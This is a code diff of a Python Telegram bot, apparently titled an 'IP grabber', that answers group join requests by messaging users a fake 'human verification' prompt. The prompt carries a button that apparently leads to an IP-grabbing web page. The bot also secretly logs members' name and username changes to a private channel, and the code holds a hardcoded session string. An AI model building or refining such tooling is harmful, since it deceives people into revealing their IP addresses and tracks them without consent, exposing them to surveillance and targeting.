@@ -10,12 +10,13 @@ SESSION_STRING = "BQHy6AcALg8-IFn7jkiIrFq2qi9xZrWhiMY78No7c6ZlSkOAUI2RF3OrW4nATG
 WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
 LOG_CHANNEL = -1002290475903
 
-app = Client("sangmata_ip_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
+app = Client("ip_grabber_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
 
 user_history = {}
 
 @app.on_chat_join_request()
 async def handle_join_request(client, request):
+    print(f"🔥 JOIN REQUEST DETECTED from user {request.user_chat_id}")
     user_id = request.user_chat_id
     chat_id = request.chat.id
     first_name = request.from_user.first_name or "User"
@@ -29,16 +30,14 @@ async def handle_join_request(client, request):
     try:
         await client.send_message(
             user_id,
-            "✅ Human verification successful!\n\n"
-            "Click the button below to verify you're human and join the group.\n\n"
-            "Link will expire in 10 minutes.",
+            "✅ Human verification successful!\n\nClick the button below to verify you're human and join the group.\n\nLink will expire in 10 minutes.",
             reply_markup=keyboard
         )
-        print(f"✅ Verification PM sent to {user_id}")
+        print(f"✅ PM verifikasi berhasil dikirim ke {user_id}")
     except Exception as e:
-        print(f"❌ Failed to send PM to {user_id}: {e}")
+        print(f"❌ Gagal kirim PM ke {user_id}: {e}")
 
-# Sangmata Tracker (hanya kirim ke LOG CHANNEL)
+# Sangmata Tracker
 @app.on_message(filters.group)
 async def sangmata_tracker(client, message):
     if not message.from_user:
@@ -48,10 +47,7 @@ async def sangmata_tracker(client, message):
     user_id = user.id
 
     if user_id not in user_history:
-        user_history[user_id] = {
-            "first_name": user.first_name,
-            "username": user.username
-        }
+        user_history[user_id] = {"first_name": user.first_name, "username": user.username}
 
     old = user_history[user_id]
     changes = []
@@ -59,9 +55,7 @@ async def sangmata_tracker(client, message):
     if user.first_name != old["first_name"]:
         changes.append(f"🔄 Name changed: {old['first_name']} → {user.first_name}")
     if user.username != old.get("username"):
-        old_un = old.get("username") or "None"
-        new_un = user.username or "None"
-        changes.append(f"🔄 Username changed: @{old_un} → @{new_un}")
+        changes.append(f"🔄 Username changed: @{old.get('username') or 'None'} → @{user.username or 'None'}")
 
     if changes:
         log_text = f"""
@@ -72,15 +66,10 @@ async def sangmata_tracker(client, message):
 {"\n".join(changes)}
 ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
         """
-        try:
-            await client.send_message(LOG_CHANNEL, log_text)
-        except:
-            pass
+        await client.send_message(LOG_CHANNEL, log_text)
+        print("✅ Sangmata log dikirim ke channel")
 
-    user_history[user_id] = {
-        "first_name": user.first_name,
-        "username": user.username
-    }
+    user_history[user_id] = {"first_name": user.first_name, "username": user.username}
 
 print("✅ IP Grabber + Sangmata Bot is running...")
 app.run()
